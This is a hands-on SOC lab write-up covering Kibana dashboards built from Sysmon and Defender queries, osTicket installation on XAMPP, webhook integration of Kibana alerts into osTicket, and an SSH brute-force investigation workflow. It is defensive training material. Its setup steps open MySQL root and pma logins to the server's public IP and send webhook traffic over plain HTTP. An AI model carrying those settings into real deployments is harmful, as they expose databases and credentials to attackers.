<img width="696" height="713" alt="Screenshot 2026-04-21 201540" src="https://github.com/user-attachments/assets/40e1c622-deac-4e71-a3f1-59c21a81569f" />

Give a name and set as critical

<img width="588" height="743" alt="Screenshot 2026-04-21 201800" src="https://github.com/user-attachments/assets/ded8a14c-10c7-487e-8b3c-c1bb636e19b8" />

- Set a run time and additional look-back time of 5 minutes each
- Create and Enable Rule

<img width="1255" height="807" alt="Screenshot 2026-04-21 202151" src="https://github.com/user-attachments/assets/49df90e4-99da-4b84-be9b-916414bb25c3" />

Now we're gonna use this query:

<img width="978" height="759" alt="Screenshot 2026-04-21 204716" src="https://github.com/user-attachments/assets/94a898b4-823f-41e0-b730-cdd8e434c3e0" />

update our query again, and use this field in the rule:

<img width="1671" height="813" alt="Screenshot 2026-04-21 205037" src="https://github.com/user-attachments/assets/d2217451-8b8a-476a-a946-3b26f2e24fc4" />

After playing around with the search, we have determined our queries we will be using in our dashboard:

- Event ID: 1 - Process Creates - powershell, cmd, rundll32
event.code: 1 and event.provider: Microsoft-Windows-Sysmon and (powershell or cmd or rundll32)

- Event ID: 3 - Network Connections (External) any processes INITIATING a network connection outbound

- Event.code: 3 and event.provider: Microsoft-Windows-Sysmon and winlog.event_data.Initiated: true

- Event ID: 5001
- event.code: 5001 and event.provider: Microsoft-Windows-Windows Defender

## We are ready to create our dashbard now that we know our data and queries to use.

Paste this query after selecting to create a new dashboard and add a visualization:
- event.code: 1 and event.provider: Microsoft-Windows-Sysmon and (powershell or cmd or rundll32)
- Add the timestampt field. This will add a table in the dashboard.
- Let's add the fields we listed previously:
- host.hostname
- message
- winlog.event_data.CommandLine
- winlog.event_data.Image
- winlog.event_data.ParentCommandLine
- winlog.event_data.ParentImage
- winlog.event_data.ProcessGuid
- winlog.event_data.User

- Change the name and make the value limit be 999, and make sure they are not grouped.

<img width="1906" height="864" alt="Screenshot 2026-04-21 213600" src="https://github.com/user-attachments/assets/17afda9a-5a07-457a-926b-0ab6326a96af" />

- Select save and close. Give a name.
- Review our Table in our Dashboard

<img width="1904" height="496" alt="Screenshot 2026-04-21 214152" src="https://github.com/user-attachments/assets/18d86e67-cb86-401c-b5a7-0ade08d7e6b8" />

- We will make another table or graph and use:
- event.code: 3 and event.provider: Microsoft-Windows-Sysmon and winlog.event_data.Initiated: true

- we'll use the following fields:
- <img width="322" height="104" alt="Screenshot 2026-04-21 215455" src="https://github.com/user-attachments/assets/60a78095-11cd-4d6e-a2fc-11c9760cd41f" />

- Save table

- Make another table and use the following query:
- event.code: 5001 and event.provider: Microsoft-Windows-Windows Defender
- Give appropriate names and save Dashboard.

**Unfortunately for me, I think I have ran into another bug with version 9.3.2, so the last 2 tables are not showing data, despite them showing data while I edit them. I may have to come up with a second system to view these.

## Ticketing System
### What is it?
Can be an alert, customer compaint, a troubleshooting request, or any request really.

Aufit trail and accountability

This references our AAA:
- Authentication
- Authorization
- Accounting

### oSTicket is the Ticketing System We Will be Using

Customize fields
Create Ticket Filters for routeing purposes
Assign and Transfer Tickets
Send SLA (Service Level Agreements)

### Will use Free Open Source option
- We have free email Integration supported, but that's it

## Setup and Configure oSTicket

### Deploying new server for ticketing system
_Start by Deploying a new server on VULTR (or whatever Virtual platform you are using._
- selecting shared CPU
- select our location
- Will choose 55 GB at 1 CPU option (under Cloud Compute)
- operating system will be Windows Standard
- We do want to select VPC (Virtual Private Cloud). Make sure to select our existing Subnet for our Environment we made at the beginning of this lab.
- I am naming my hostname to be 'MYSOC-osTicket'
- Select Deploy

- After deployed, select view console for new server to make sure it comes up. It may take a few minutes.
- We will want to make sure Remote Desktop is turned on in settings on this new server.
- You may also need to enable the file and printer sharing ipv4 for incoming rules in Firewall
- Now, however, we can just use RDP to remote into it. RDP using our IP address for this ostecket server


## 🎫 osTicket Setup Walkthrough
> **Based on:** [MyDFIR SOC Analyst Challenge – Day 24](https://www.youtube.com/watch?v=xgxQuLL33oU)  
> **Goal:** Deploy and configure osTicket, an open-source ticketing system, on a cloud-hosted Windows Server using XAMPP.

---

### 📋 Table of Contents
1. [Overview](#overview)
2. [Prerequisites](#prerequisites)
3. [Step 1 – Deploy a Windows Server on Vultr](#step-1--deploy-a-windows-server-on-vultr)
4. [Step 2 – Connect via RDP & Install XAMPP](#step-2--connect-via-rdp--install-xampp)
5. [Step 3 – Configure Firewall Rules](#step-3--configure-firewall-rules)
6. [Step 4 – Configure phpMyAdmin](#step-4--configure-phpmyadmin)
7. [Step 5 – Edit XAMPP Config Files](#step-5--edit-xampp-config-files)
8. [Step 6 – Create the osTicket Database](#step-6--create-the-osticket-database)
9. [Step 7 – Download & Deploy osTicket](#step-7--download--deploy-osticket)
10. [Step 8 – Run the osTicket Installer](#step-8--run-the-osticket-installer)
11. [Step 9 – Log In & Verify](#step-9--log-in--verify)
12. [Troubleshooting](#troubleshooting)
13. [Next Steps](#next-steps)

---

### Overview

osTicket is an open-source help desk and ticketing system used by SOC teams to:
- **Log and track** security incidents
- **Route tickets** to the right analyst
- **Prioritize** alerts by severity

In this lab, we spin up a fresh Windows Server in Vultr, install the XAMPP web stack, and host osTicket on it so it can later be integrated with Elastic/Kibana alerts.

---

### Prerequisites

| Requirement | Details |
|---|---|
| Cloud Account | [Vultr](https://www.vultr.com) (new accounts get $300 free credit) |
| VPC Network | Same VPC used for your ELK stack from earlier challenge days |
| Firewall Group | `MYDFIR-30-Day-Challenge` group already created |
| RDP Client | Built-in Windows Remote Desktop or any RDP app |

---

### Step 1 – Deploy a Windows Server on Vultr

1. Log in to your **Vultr** dashboard and click **Deploy New Server**.

   ![New Server](https://deepalibolsekar.github.io/assets/OsTicket/new-server.png)

2. Select **Shared CPU** and pick the **same region** as your other servers (e.g., your ELK server).

   ![Shared CPU](https://deepalibolsekar.github.io/assets/OsTicket/shared-cpu.png)
   ![Location](https://deepalibolsekar.github.io/assets/OsTicket/location.png)

3. For the OS image, choose **Windows Standard Server**.

   ![Windows Image](https://deepalibolsekar.github.io/assets/OsTicket/win-img.png)

4. Select the plan: **1 vCPU / 2 GB RAM** is sufficient.

   ![Plan](https://deepalibolsekar.github.io/assets/OsTicket/plan.png)

5. Under **Additional Features**, enable **VPC 2.0** and attach it to the same private network as your ELK server.

   ![VPC](https://deepalibolsekar.github.io/assets/OsTicket/vpc.png)

6. Give the instance a descriptive hostname (e.g., `MYDFIR-osTicket-Server`) and click **Deploy Now**.

   ![Hostname](https://deepalibolsekar.github.io/assets/OsTicket/hostname.png)

7. Once deployed, go to **Firewall** settings and attach the `MYDFIR-30-Day-Challenge` firewall group to this server.

> ⚠️ **Note:** Wait until the server status shows **Running** before attempting to connect.

---

### Step 2 – Connect via RDP & Install XAMPP

1. From the Vultr dashboard, copy the server's **public IP** and the auto-generated **Administrator password**.
2. Open **Remote Desktop Connection** on your local machine, enter the IP, and log in.
3. Inside the server, open a browser and download **XAMPP 8.2.x** from:  
   👉 [https://www.apachefriends.org/download.html](https://www.apachefriends.org/download.html)

   ![XAMPP Download](https://deepalibolsekar.github.io/assets/OsTicket/xampp-download.png)

4. Run the installer. If a UAC or antivirus warning appears, click **OK** to continue.

   ![Warning OK](https://deepalibolsekar.github.io/assets/OsTicket/warning-ok.png)

5. Proceed through the installer with default settings and let it complete.

   ![Install XAMPP](https://deepalibolsekar.github.io/assets/OsTicket/install-xampp.png)

6. After installation, the **XAMPP Control Panel** will launch. Click **Start** next to both **Apache** and **MySQL**.

   ![Start XAMPP](https://deepalibolsekar.github.io/assets/OsTicket/start-xampp.png)

---

### Step 3 – Configure Firewall Rules

While XAMPP installs, set up Windows Firewall rules so the osTicket web interface is reachable.

1. Open **Windows Defender Firewall with Advanced Security**.
2. Click **Inbound Rules → New Rule**.
3. Select **Port**, then click Next.
4. Choose **TCP** and enter `80, 443` as the specific local ports.
5. Allow the connection, apply to all profiles, and name the rule (e.g., `XAMPP HTTP/HTTPS`).

   ![Create Firewall Rule](https://deepalibolsekar.github.io/assets/OsTicket/create-new-rule.png)

> 💡 Port **80** is used for HTTP and port **443** for HTTPS — both needed by Apache/XAMPP.

---

### Step 4 – Configure phpMyAdmin

By default, phpMyAdmin only accepts connections from `localhost`. We need to allow your public IP.

1. In the XAMPP Control Panel, click the **Admin** button next to Apache. This opens the XAMPP dashboard in a browser.
2. Click **phpMyAdmin** from the top menu.

   ![phpMyAdmin](https://deepalibolsekar.github.io/assets/OsTicket/phpmyadmin.png)

3. Navigate to **User Accounts**. Find the `root` user entry and click **Edit Privileges**.

   ![User Accounts](https://deepalibolsekar.github.io/assets/OsTicket/user-acc.png)

4. Update the **hostname** from `localhost` to your server's **public IP address**. Set a strong password and save.

   ![Root Account Created](https://deepalibolsekar.github.io/assets/OsTicket/root-acc-created.png)

5. Repeat the same process for the **pma** (phpMyAdmin) user account — update hostname to the server IP and set a password.

   ![PMA Account](https://deepalibolsekar.github.io/assets/OsTicket/pm-acc-created.png)

   ![Accounts Modified](https://deepalibolsekar.github.io/assets/OsTicket/acc-modified.png)

---

### Step 5 – Edit XAMPP Config Files

Two config files need to be updated to reflect the server's IP address instead of `localhost`.

#### 5a – `httpd-xampp.conf` (Apache domain name)

1. Navigate to: `C:\xampp\apache\conf\extra\`
2. Open `httpd-xampp.conf` in Notepad (or Notepad++).
3. Find the line containing `apache_domainname` and replace `localhost` with your server's public IP.
4. Save and close.

   ![Properties Config](https://deepalibolsekar.github.io/assets/OsTicket/properties.png)

#### 5b – `config.inc.php` (phpMyAdmin connection settings)

1. Navigate to: `C:\xampp\phpMyAdmin\`
2. Open `config.inc.php` in a text editor.
3. Update the following values:
   - `$cfg['Servers'][$i]['host']` → your server's **public IP**
   - `$cfg['Servers'][$i]['password']` for both `root` and `controlpass` → the passwords you just set
4. Save and close.

   ![Config INC](https://deepalibolsekar.github.io/assets/OsTicket/config.png)

> 🔄 After saving both files, **restart Apache** from the XAMPP Control Panel for changes to take effect.

---

### Step 6 – Create the osTicket Database

1. Open your browser and navigate to: `http://<YOUR-SERVER-IP>/phpmyadmin`
2. Log in with the `root` credentials you configured.
3. Click **New** in the left sidebar and create a database named `osticket`.

   ![Create Database](https://deepalibolsekar.github.io/assets/OsTicket/db-create.png)

4. With `osticket` selected, go to **Privileges → Add user account** (or grant the `root` user full privileges on this database).

---

### Step 7 – Download & Deploy osTicket

1. On the server, open a browser and go to the official osTicket download page:  
   👉 [https://osticket.com/download/](https://osticket.com/download/)

   ![osTicket Download](https://deepalibolsekar.github.io/assets/OsTicket/open-src-download.png)

2. Select **Self-Hosted** as the deployment type.

   ![Self Hosted](https://deepalibolsekar.github.io/assets/OsTicket/self-hosted.png)

3. Pick the latest stable release.

   ![Release](https://deepalibolsekar.github.io/assets/OsTicket/release.png)

4. Choose your preferred **language** (English is fine). Skip the **Plugins** step.

   ![Language](https://deepalibolsekar.github.io/assets/OsTicket/lang.png)

5. Click through any newsletter prompt (you can decline) and download the ZIP file.

6. **Extract** the ZIP file contents.

   ![Extract osTicket](https://deepalibolsekar.github.io/assets/OsTicket/extract-osticket.png)

7. Copy the **`scripts`** and **`upload`** folders from the extracted archive into a new folder:
   ```
   C:\xampp\htdocs\osticket\
   ```

   ![Copy to htdocs](https://deepalibolsekar.github.io/assets/OsTicket/copy-to-htdocs.png)

---

### Step 8 – Run the osTicket Installer

1. Open a browser and navigate to:
   ```
   http://<YOUR-SERVER-IP>/osticket/upload
   ```
   You should see the osTicket prerequisites/installer page.

   ![osTicket Installer](https://deepalibolsekar.github.io/assets/OsTicket/osticket-installer.png)

2. Before clicking **Continue**, rename the sample config file:
   - Navigate to: `C:\xampp\htdocs\osticket\upload\include\`
   - Rename `ost-sampleconfig.php` → `ost-config.php`

   ![OST Config](https://deepalibolsekar.github.io/assets/OsTicket/ost-config.png)

3. Return to the browser and click **Continue**. Fill in the installation form:

   | Field | Value |
   |---|---|
   | Helpdesk Name | Your chosen name (e.g., `MyDFIR SOC`) |
   | Default Email | An admin email address |
   | Admin Username | Your desired admin login |
   | Admin Password | A strong password (save this!) |
   | Database Name | `osticket` |
   | Database User | `root` |
   | Database Password | The root password you set earlier |
   | **Database Host** | Your server's **public IP** (not `localhost`!) |

   ![Install Fields](https://deepalibolsekar.github.io/assets/OsTicket/instal-fields-1.png)

4. Click **Install Now**.

   ![Install Now](https://deepalibolsekar.github.io/assets/OsTicket/install-now.png)

5. The installer will run — give it a moment.

   ![Doing Stuff](https://deepalibolsekar.github.io/assets/OsTicket/doing-stuff-page.png)

6. On the final page, follow the instructions to set `ost-config.php` to **read-only**:
   - Right-click `ost-config.php` → Properties → Security → Advanced
   - Set **Everyone** to **Read** only.

   ![File Permissions](https://deepalibolsekar.github.io/assets/OsTicket/file-perm.png)

   ![Success](https://deepalibolsekar.github.io/assets/OsTicket/success.png)

> 🎉 **Installation complete!**

7. **Bookmark** the two important URLs shown on the success page:

   | URL | Purpose |
   |---|---|
   | `http://<IP>/osticket/upload/` | End-user ticket portal |
   | `http://<IP>/osticket/upload/scp/` | Staff / Admin login panel |

   ![Staff Control Panel Link](https://deepalibolsekar.github.io/assets/OsTicket/copy-staff-contrl-panel.png)

---

### Step 9 – Log In & Verify

1. Navigate to the **Staff Control Panel**:
   ```
   http://<YOUR-SERVER-IP>/osticket/upload/scp/
   ```
2. Log in with the **admin credentials** you set during installation.

   ![Staff Login](https://deepalibolsekar.github.io/assets/OsTicket/staff-login.png)

3. You should now see the osTicket **Admin Panel** — your ticketing system is live!

   ![Admin Panel](https://deepalibolsekar.github.io/assets/OsTicket/admin-panel.png)

From here you can:
- Create and manage **agents**
- Configure **ticket categories** and **SLA plans**
- View and respond to incoming tickets

---

### Troubleshooting

| Problem | Likely Cause | Fix |
|---|---|---|
| Can't access phpMyAdmin from browser | Firewall blocking port 80 | Double-check Windows Firewall inbound rule for port 80 |
| Installer fails / DB connection error | Wrong DB host (`localhost` instead of IP) | Use the server's **public IP** in the DB Host field |
| `root` account not allowing remote login | phpMyAdmin user hostname still set to `localhost` | Re-edit the `root` user account hostname in phpMyAdmin |
| `ost-config.php` not found error | File not renamed yet | Rename `ost-sampleconfig.php` → `ost-config.php` |
| Blank page at `/osticket/upload` | Files in wrong directory | Ensure `scripts/` and `upload/` are directly inside `C:\xampp\htdocs\osticket\` |

---

### Next Steps

With osTicket running, the next step to integrate osTicket with Elastic/Kibana**, where you'll:
- Generate an **API key** inside osTicket
- Configure an **Elastic webhook connector** to automatically create tickets from SIEM alerts
- Test end-to-end ticket creation from a brute-force detection rule

---

### Resources

- 🌐 [osTicket Official Site](https://osticket.com)
- 📦 [XAMPP Download](https://www.apachefriends.org/download.html)
- 📖 [osTicket API Docs (for Day 25)](https://github.com/osTicket/osTicket/blob/develop/setup/doc/api/tickets.md)

---

## osTicket + ELK Integration
> **MyDFIR 30-Day SOC Analyst Challenge**  
> Based on: [YouTube Tutorial — Day 25](https://www.youtube.com/watch?v=P9YxutqWAF0&list=PLG6KGSNK4PuBb0OjyDIdACZnb8AoNBeq6&index=26)

---

### 🎯 Objective

Integrate your osTicket ticketing system with the ELK Stack (Elasticsearch + Kibana) so that **security alerts automatically create support tickets** — enabling structured incident tracking and response.

---

### 📋 Prerequisites

Before starting, ensure you have:

- ✅ A running **osTicket** instance (Windows Server with XAMPP, or Ubuntu)
- ✅ A configured **ELK Stack** (Elasticsearch + Kibana) — accessible via web UI on port `5601`
- ✅ Both servers hosted in the **same VPC / private network** (e.g., Vultr VPC 2.0)
- ✅ Basic networking knowledge (IP addressing, firewall rules)
- ✅ An active **Kibana 30-day trial** (required for Webhook connectors)

#### Architecture Overview

```
┌────────────────────────────────────────────────┐
│                  Vultr VPC                     │
│                                                │
│   ┌─────────────────┐    Webhook (HTTP POST)   │
│   │  Elastic/Kibana │ ──────────────────────► │
│   │    Server       │                          │
│   └─────────────────┘    ┌──────────────────┐  │
│                          │  osTicket Server  │  │
│                          │  (XAMPP/Windows)  │  │
│                          └──────────────────┘  │
└────────────────────────────────────────────────┘
```

> **Key point:** Both servers must be on the same private network. The osTicket API key is tied to the **private IP** of the ELK server within the VPC.

---

### Part 1 — Generate an API Key in osTicket

The osTicket API key authorizes Elastic to create tickets on your behalf.

#### Steps

1. Log in to your **osTicket Staff Control Panel**  
   `http://<osticket-public-ip>/scp/`

2. In the top-right corner, switch to **Admin Panel**

   ![Admin Panel toggle](https://i.imgur.com/placeholder-admin-panel.png)
   > *Toggle between Staff and Admin panel using the link in the top navigation bar.*

3. Navigate to:  
   **Manage → API → Add New API Key**

4. Fill in the fields:

   | Field | Value |
   |-------|-------|
   | **IP Address** | Private IP of your ELK server (e.g., `172.16.0.x`) |
   | **Can Create Tickets** | ✅ Checked |
   | **Internal Notes** | e.g., `ELK Stack Integration Key` |

   > ⚠️ Use the **private/VPC IP** of your ELK server — not the public IP. Both servers must be on the same VPC subnet (e.g., `172.16.0.0/24`).

5. Click **Add Key**

6. **Copy and save the generated API key** — you will need it in Part 2.

   ```
   Example key (yours will differ):
   a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4
   ```

---

### Part 2 — Create a Webhook Connector in Kibana

Kibana's connector sends an HTTP POST to osTicket whenever an alert fires.

#### Activate the 30-Day Trial (if not done yet)

1. In Kibana, open the **hamburger menu (☰)** → scroll down to **Management** → **Stack Management**
2. Under **License Management**, click **Start a 30-day trial**  
   > This unlocks the Webhook connector type.

#### Create the Webhook Connector

1. In **Stack Management**, under **Alerts and Insights**, click **Connectors**

2. Click **Create connector**

3. Select **Webhook**

4. Configure the connector:

   | Setting | Value |
   |---------|-------|
   | **Connector Name** | `osTicket` (or any name you prefer) |
   | **Method** | `POST` |
   | **URL** | `http://<osticket-private-ip>/api/tickets.json` |
   | **Authentication** | None |
   | **Add HTTP header** | `X-API-Key` : `<your-osticket-api-key>` |
   | **Content-Type header** | `application/json` |

   > ⚠️ Use the **private IP** of your osTicket server for the URL (since both servers are on the same VPC).

   **Headers summary:**
   ```
   X-API-Key: a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4
   Content-Type: application/json
   ```

5. Click **Save & Test** — do NOT run the test yet; first configure the body.

---

### Part 3 — Configure the Ticket Body (JSON Payload)

The webhook body tells osTicket what content to put in the ticket. This uses osTicket's JSON API format.

#### Reference

The full osTicket API documentation (including payload examples) is available here:  
📄 [osTicket Tickets API — GitHub](https://github.com/osTicket/osTicket/blob/develop/setup/doc/api/tickets.md)

#### JSON Payload (Basic Test)

Paste the following into the **Body** field of the webhook connector:

```json
{
    "alert": true,
    "autorespond": true,
    "source": "API",
    "name": "Angry User",
    "email": "api@osticket.com",
    "phone": "3185558634X123",
    "subject": "Testing API",
    "ip": "123.211.233.122",
    "message": "data:text/html,MESSAGE <b>HERE</b>"
}
```

> This is taken directly from the [osTicket API docs](https://github.com/osTicket/osTicket/blob/develop/setup/doc/api/tickets.md). It's a static test payload — you'll enrich it with dynamic alert data in Part 4.

#### Enriched Payload (with Kibana Alert Variables)

Once the basic test works, replace the body with a dynamic version that pulls real alert context:

```json
{
    "alert": true,
    "autorespond": true,
    "source": "API",
    "name": "Kibana Alert",
    "email": "soc@yourdomain.com",
    "subject": "{{rule.name}}",
    "ip": "{{context.host.ip}}",
    "message": "data:text/html,<b>Alert:</b> {{rule.name}}<br><b>Severity:</b> {{context.rule.severity}}<br><b>Host:</b> {{context.host.name}}<br><b>Source IP:</b> {{context.source.ip}}<br><b>Time:</b> {{context.date}}<br><b>Rule ID:</b> {{rule.id}}"
}
```

> **Tip:** Kibana uses Mustache `{{variable}}` syntax for dynamic alert fields. Available variables depend on your alert rule type.

---

### Part 4 — Test the Integration

#### Run a Manual Test

1. Back in the Webhook connector page, click **Run**
2. The body will be sent to osTicket
3. If successful, you'll see:  
   ```
   HTTP 201 Created
   ```

#### Verify in osTicket

1. Go to your osTicket **Staff Control Panel**
2. Click **Admin Panel** → check the **Tickets** tab
3. You should see a new ticket created — e.g., **"Testing API"** from *Angry User*

   > ✅ If the ticket appears, the integration is working!

#### Troubleshooting Common Issues

| Problem | Fix |
|---------|-----|
| `401 Unauthorized` | Check that the `X-API-Key` header value matches your osTicket API key exactly |
| `Connection refused` | Verify the osTicket server IP/URL is correct and accessible from ELK; check firewall rules |
| No ticket created | Restart XAMPP on the osTicket server, then re-run the test |
| `400 Bad Request` | Validate your JSON payload formatting (no trailing commas, valid JSON) |
| Wrong IP in API key | The osTicket API key is IP-locked — make sure you used the ELK server's **private** IP |

**Restart procedure (if tickets stop generating):**
1. RDP into your osTicket Windows server
2. Open XAMPP Control Panel → Stop & Start **Apache** and **MySQL**
3. Log back in to osTicket
4. Re-run the Kibana connector test

---

### Part 5 — Attach the Connector to an Alert Rule

Once tested, wire the connector to a real alert so tickets are created automatically.

1. In Kibana, go to **Security → Rules** (or **Alerts → Manage Rules**)
2. Open an existing rule (e.g., your SSH brute force or RDP brute force rule)
3. Edit the rule → scroll to **Actions**
4. Click **Add action** → select your `osTicket` webhook connector
5. Paste the enriched JSON payload (from Part 3) into the body
6. Set the action to trigger **On each alert** or **On new alert**
7. **Save** the rule

Now, whenever the rule fires, a ticket is automatically created in osTicket!

---

### 🔍 What the Ticket Looks Like

After a successful alert-to-ticket flow, osTicket will show something like:

```
Ticket #: 123456
Subject:  SSH Brute Force Detected
From:     Kibana Alert <soc@yourdomain.com>
Status:   Open
Priority: Normal

Alert: SSH Brute Force Detected
Severity: High
Host: MYDFIR-Linux-Server
Source IP: 185.220.101.5
Time: 2024-09-24T18:45:00Z
Rule ID: abc123-...
```

> **Best practice:** Once you open a ticket, assign it to yourself to prevent duplicate investigation. Close the ticket with documented notes once resolved.

---

### ✅ Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Generate API key in osTicket | ELK is authorized to create tickets |
| 2 | Create Webhook connector in Kibana | Kibana can POST to osTicket |
| 3 | Configure JSON body payload | Ticket content is defined |
| 4 | Test the connector | Verify ticket appears in osTicket |
| 5 | Attach to alert rule | Alerts auto-generate tickets going forward |

## Investigating an SSH Brute Force Attack

---

### 📋 Summary

This tutorial covers how a SOC Analyst investigates an **SSH brute force attack** using the **Elastic SIEM (Kibana)**. You'll learn how to triage an alert, enrich the attacker's IP using open-source threat intelligence tools, trace the scope of the attack, and then automate ticket creation in **osTicket** so that every new alert generates a trackable incident ticket.

**What you'll learn:**
- How to navigate Elastic Security alerts in Kibana
- A repeatable 4-question framework for brute force investigations
- How to use AbuseIPDB and GreyNoise for IP reputation lookups
- How to use Kibana Timelines for threat hunting
- How to configure Elastic alert rules to auto-create tickets in osTicket
- How to configure `server.publicBaseUrl` in Kibana so rule links work inside tickets

---

### 🛠️ Prerequisites

Before starting this module, make sure you have the following in place from earlier days of the challenge:

| Component | Purpose |
|-----------|---------|
| Elastic Stack (ELK) on a cloud server | SIEM — stores and queries logs |
| Kibana | Web UI for Elastic |
| Elastic Agent on Ubuntu server | Forwards SSH auth logs |
| SSH Brute Force detection rule | Already created in a prior day |
| osTicket with Webhook connector | Ticketing system for alerts |
| Kali Linux (attacker machine) | Used to generate brute force telemetry |

---

### 🔍 Part 1 — Investigating the SSH Brute Force Alert

#### Step 1: Navigate to Alerts in Kibana

1. Log in to your **Kibana** dashboard.
2. Click the **hamburger menu (☰)** in the top-left.
3. Under the **Security** section, click **Alerts**.

You will see a list of all triggered alerts. Look for alerts generated by your SSH Brute Force rule (e.g., `MyDFIR-SSH-Brute-Force-Attempt`).

> 💡 **Tip:** The alert count will vary based on your environment. Focus on one SSH brute force alert to begin your investigation.

---

#### Step 2: Expand the Alert Details

Click on one of the SSH brute force alerts to expand it. Key fields to note:

| Field | Description |
|-------|-------------|
| `source.ip` | The attacker's IP address |
| `user.name` | The account being targeted (e.g., `root`) |
| `event.outcome` | Whether the attempt succeeded or failed |
| `event.count` | Number of attempts in the time window |
| `@timestamp` | When the alert was triggered |

> **Example:** Source IP `115.95.180.244` made 7 failed SSH login attempts against the `root` user within a 5-minute window.

---

#### Step 3: Apply the 4-Question Investigation Framework

When investigating any brute force attack, answer these four questions in order:

---

##### ❓ Question 1 — Is this IP known for brute force activity?

Use open-source threat intelligence tools to check the reputation of the source IP.

**Tool 1: [AbuseIPDB](https://www.abuseipdb.com)**
1. Copy the `source.ip` value from the alert.
2. Paste it into AbuseIPDB's search bar.
3. Review:
   - **Abuse Confidence Score** (0–100%) — higher = more likely malicious
   - **Number of reports** — how many times this IP has been flagged
   - **Report categories** — look for "SSH/FTP Brute Force" entries

**Tool 2: [GreyNoise](https://viz.greynoise.io)**
1. Search the same IP on GreyNoise.
2. Look for tags such as:
   - `SSH Bruteforcer`
   - `SSH Alternative Port Crawler`
3. GreyNoise will classify the IP as **Malicious**, **Benign**, or **Unknown**.

> **Expected Result:** Known attacker IPs will often have AbuseIPDB scores of 90–100% with thousands of reports, and GreyNoise will tag them as SSH brute-forcers.

---

##### ❓ Question 2 — Were any other users targeted by this IP?

Go back to Kibana and search for all activity from the attacker's IP across all users.

**In Kibana Discover:**
```kql
source.ip : "<attacker-IP>" and system.auth.ssh.event : "Failed"
```

Review the `user.name` field to see every account the attacker attempted. Common targets include:
- `root`
- `admin`
- `administrator`
- `ubuntu`
- Common usernames from wordlists (e.g., `david`, `test`, `deploy`)

> This helps understand the **scope** of the attack and whether it was a targeted or opportunistic scan.

---

##### ❓ Question 3 — Were any login attempts successful?

Search specifically for successful authentications from the attacker's IP:

```kql
source.ip : "<attacker-IP>" and event.action : "ssh_login" and event.outcome : "success"
```

- If **no results** → The attack failed. Document and close/escalate accordingly.
- If **results exist** → The attacker got in. Proceed to Question 4 immediately.

---

##### ❓ Question 4 — If successful, what happened after login?

If a successful login is found, investigate **post-compromise activity**:

1. Note the **timestamp** of the successful login.
2. Query for events from that source IP or the affected hostname **after** that timestamp.
3. Look for suspicious activity such as:
   - New processes spawned
   - File creation or modification
   - Privilege escalation attempts
   - Outbound network connections

> 🚨 A successful brute force login is a **confirmed incident** and should be escalated per your organization's incident response process.

---

#### Step 4: Use Kibana Timelines for Deeper Investigation

Kibana's **Timelines** feature is useful for correlating events during threat hunting.

1. In Kibana, under **Security**, click **Timelines**.
2. Click **Create new timeline** or open an existing one.
3. Add relevant filters (e.g., the attacker's IP, the targeted hostname).
4. Review the chronological sequence of events to build a picture of the attack.

> Timelines help you answer: *What happened, in what order, and to which systems?*

---

### 🎫 Part 2 — Automating Alert Tickets in osTicket

Manually checking Kibana for new alerts isn't scalable. In this section, you'll configure your Elastic SSH Brute Force detection rule to **automatically create an osTicket** whenever it fires.

---

#### Step 1: Configure `server.publicBaseUrl` in Kibana

This setting enables Elastic to embed a direct link to the triggering rule inside each osTicket. Without it, the `{{rule.url}}` variable in the ticket body will be empty.

1. SSH into your ELK server:
   ```bash
   ssh root@<ELK-server-IP>
   ```

2. Open the Kibana configuration file:
   ```bash
   nano /etc/kibana/kibana.yml
   ```

3. Add or update the following line (replace with your actual ELK server IP):
   ```yaml
   server.publicBaseUrl: "http://<ELK-server-IP>:5601"
   ```

4. Save and exit (`Ctrl+X` → `Y` → `Enter`).

5. Restart the Kibana service:
   ```bash
   systemctl restart kibana.service
   ```

6. Verify it's running:
   ```bash
   systemctl status kibana.service
   ```

---

#### Step 2: Edit the SSH Brute Force Rule to Add an Action

1. In Kibana, navigate to:  
   **Security → Rules → Detection Rules (SIEM)**

2. Find your SSH Brute Force rule (e.g., `MyDFIR-SSH-Brute-Force-Attempt`).

3. Click **Edit rule settings**.

4. Go to the **Actions** tab.

5. Set **Action frequency** to: `Per rule run`

---

#### Step 3: Configure the osTicket Webhook Action

1. Under Actions, select your **osTicket Webhook connector** (configured in a prior day).

2. In the **Body** field, paste the osTicket XML payload. Use the template from the [osTicket API docs](https://github.com/osTicket/osTicket/blob/develop/setup/doc/api/tickets.md):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<ticket alert="true" autorespond="true" source="API">
  <name>Elastic</name>
  <email>api@osticket.com</email>
  <subject>{{rule.name}}</subject>
  <phone>318-555-8634X123</phone>
  <message type="text/plain"><![CDATA[
    Please investigate the alert generated by {{rule.name}}.
    ---
    Description: {{rule.description}}
    ---
    Link: {{rule.url}}
  ]]></message>
</ticket>
```

> 💡 **Variable reference:** See all available Elastic rule variables at:  
> https://www.elastic.co/guide/en/security/current/rules-ui-create.html#rule-action-variables

3. Click **Save changes**.

---

#### Step 4: Verify Ticket Creation

1. Trigger a new SSH brute force event (or wait for the next one from your attacker machine).
2. Open your **osTicket** web interface.
3. You should see a new ticket automatically created with:
   - The rule name as the subject
   - A link back to the Elastic alert
   - The rule description in the message body

---

#### Step 5: Work the Ticket in osTicket

Once a ticket is created:

1. **Assign it** — Click the **Assigned To** field and assign it to yourself or another analyst to avoid duplicate work.
2. **Investigate** — Use the investigation framework from Part 1 to analyze the alert.
3. **Post a response** — Document your findings and actions taken as a reply on the ticket.
4. **Close or escalate** — Close the ticket if the alert is a false positive or benign; escalate if the attack was successful.

> All closed tickets are accessible under the **Closed** tab in osTicket and provide an **audit trail** for compliance and accountability purposes.

---

### ✅ Summary of Key Takeaways

| Topic | Key Point |
|-------|-----------|
| Alert triage | Start in Kibana → Security → Alerts |
| IP reputation | Use AbuseIPDB + GreyNoise for enrichment |
| Scope analysis | Search all failed logins from the attacker IP |
| Success check | Query for `event.outcome: success` from attacker IP |
| Post-compromise | Investigate activity after a successful login |
| Automation | Configure Elastic rules to auto-create osTicket tickets |
| Audit trail | All tickets in osTicket are logged and trackable |

## Day 27 — Investigating an RDP Brute Force Attack

---

### 📋 Summary

This tutorial covers how a SOC Analyst investigates an **RDP (Remote Desktop Protocol) brute force attack** using the **Elastic SIEM (Kibana)**. The core investigation methodology is the same as SSH brute force (covered in Day 26), but the data sources, Windows Event IDs, and log fields differ significantly since RDP targets a **Windows server** rather than a Linux host.

By the end of this tutorial you will know how to:
